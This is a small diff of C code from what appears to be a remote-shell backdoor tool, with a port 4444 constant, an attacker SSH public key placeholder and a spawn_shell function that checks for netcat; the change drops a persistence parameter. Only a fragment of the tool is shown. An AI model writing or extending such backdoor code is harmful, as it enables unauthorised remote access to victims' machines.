@@ -12,9 +12,9 @@
 #define PORT 4444
 #define ATTACKER_SSH_PUBLIC_KEY ""
 
-bool spawn_shell(bool hasPersistency);
+bool spawn_shell();
 
-bool spawn_shell(bool hasPersistency){
+bool spawn_shell(){
 
     if (system("which nc > /dev/null 2>&1")) {
 
